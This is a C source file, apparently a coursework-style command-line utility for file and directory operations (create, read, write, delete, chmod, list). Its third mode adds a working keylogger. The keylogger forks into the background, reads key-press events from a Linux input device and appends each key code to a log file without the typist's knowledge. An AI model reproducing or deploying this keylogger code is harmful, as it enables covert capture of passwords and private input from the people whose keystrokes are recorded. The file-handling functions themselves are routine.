#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>
#include <time.h> //@YuEnTiang81391 new added library for time 
#include <linux/input.h> //@YuEnTiang81391 new added library for input

void create_file(char *filename){
    int fd = open(filename, O_CREAT | O_RDWR, 0644);
    if (fd == -1){
        perror("Error in creating file\n");
        exit(1);
    }
    close(fd);
    printf("File named '%s' created successfully\n", filename);
}

void change_permission(char *filename, mode_t mode){
    if (chmod(filename, mode) == -1){
        perror("Error in changing permission\n");
        exit(1);
    }
    printf("Permission for %s changed successfully\n", filename);
}

void read_file(char *filename){
    char buffer[1024];
    int fd = open(filename, O_RDONLY);

    if (fd == -1){
        perror("Error in reading file\n");
        exit(1);
    }

    ssize_t readFile;
    while ((readFile = read(fd, buffer, sizeof(buffer) - 1)) > 0){
        buffer[readFile] = '\0';
        printf("%s", buffer);
    }

    close(fd);
}

void write_file(char *filename){
    int fd = open(filename, O_WRONLY | O_APPEND);
    if (fd == -1){
        perror("Error in writing file\n");
        exit(1);
    }

    char buffer[1024];
    printf("Stop writing by pressing 'Ctrl+D'\n");
    printf("Enter the content to write in file:\n ");
    while (fgets(buffer, sizeof(buffer), stdin)) {
        write(fd, buffer, strlen(buffer));
    }
    close(fd);
}

void delete_file(const char *filename){
    if (remove(filename) == -1){
        perror("Error in deleting file\n");
        exit(1);
    }
    printf("File named '%s' deleted successfully\n", filename);
}

void create_dir(char *dirname){
     if (mkdir(dirname, 0755) == -1) {
        perror("Error creating directory\n");
    } else {
        printf("Directory %s created successfully.\n", dirname);
    }
}

void delete_dir(char *dirname){
    if (rmdir(dirname) == -1) {
        perror("Error deleting directory\n");
    } else {
        printf("Directory %s deleted successfully.\n", dirname);
    }
}

void print_current_directory(){
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) == NULL){
        perror("getcwd() error");
    } else {
        printf("Current working directory: %s\n", cwd);
    }
}

void list_directory(char *dirname){
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(dirname))) {
        perror("Error opening directory\n");
        return;
    } else {
        printf("*****Current directory:[%s]*****\n", dirname);
    }

    while ((entry = readdir(dir)) != NULL) {
        printf("%s\n", entry->d_name);
    }
    closedir(dir);
}

void start_keylogger(char *logfile) {
    // Run in background
    if (fork() == 0) {
        FILE *file;
        file = fopen(logfile, "a");
        if (file == NULL) {
            perror("Failed to open keylog file");
            return;
        }

        // Add timestamp at the beginning of the session
        time_t now;
        time(&now);
        char *timestamp = ctime(&now);
        if (timestamp == NULL) {
            perror("Failed to get current time");
            fclose(file);
            return;
        }
        fprintf(file, "Keylogger session started at: %s\n", timestamp);
        fclose(file);

        // Monitor the input device
        int fd;
        struct input_event ev;

        // Get the input device from environment variable or use default
        const char *dev = getenv("INPUT_DEVICE");
        if (dev == NULL) {
            dev = "/dev/input/event2"; // Default device
        }
        
        //const char *dev = "/dev/input/event2"; 

        fd = open(dev, O_RDONLY);
        if (fd == -1) {
            perror("Failed to open input device");
            exit(EXIT_FAILURE);
        }

        while (1) {
            read(fd, &ev, sizeof(struct input_event));
            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                file = fopen(logfile, "a");
                if (file != NULL) {
                    fprintf(file, "Key %d pressed\n", ev.code);
                    fclose(file);
                }
            }
        }
        close(fd);
        exit(EXIT_SUCCESS);
    }
}

int main(int argc, char *argv[]){
    if (argc < 3){
        fprintf(stderr, "Please enter in correct format!\nFormat: %s -m [mode] [argument]\n", argv[0]);
        return 1;
    }

    int mode = atoi(argv[2]); // 1 for file operation, 2 for directory operation, 3 for keylogger

    switch (mode){
        case 1:
            if (argc < 5){
                perror("Please enter correct format of arguments for file operation");
                break;
            }

            int file_operation_mode = atoi(argv[3]); // 1 for create, 2 for change permission, 3 for read, 4 for write, 5 for delete
            switch (file_operation_mode){
                case 1:
                    create_file(argv[4]);
                    break;

                case 2:
                    if (argc < 6){
                        perror("Please enter correct format of arguments for changing permission");
                        break;
                    }
                    mode_t new_mode = strtol(argv[5], NULL, 8);
                    change_permission(argv[4], new_mode);
                    break;

                case 3:
                    read_file(argv[4]);
                    break;

                case 4:
                    write_file(argv[4]);
                    break;

                case 5:
                    delete_file(argv[4]);
                    break;

                default:
                    perror("Invalid file operation\n");
            }
            break;

        case 2:
            if (argc < 4){
                perror("Please enter correct format of arguments for directory operation");
                return 1;
            }

            int directory_operation_mode = atoi(argv[3]); // 1 for create, 2 for delete, 3 for list, 4 for print current directory
            switch (directory_operation_mode){
                case 1:
                    create_dir(argv[4]);
                    break;

                case 2:
                    delete_dir(argv[4]);
                    break;

                case 3:
                    list_directory(argv[4]);
                    break;

                case 4:
                    print_current_directory();
                    break;

                default:
                    perror("Invalid directory operation\n");
            }
            break;

        case 3:
            if (argc < 4){
                fprintf(stderr, "Please specify the log file for keylogger.\n");
                return 1;
            }
            start_keylogger(argv[3]);
            break;

        default:
            perror("Invalid operation mode\n");
            break;
    }

    return 0;
}
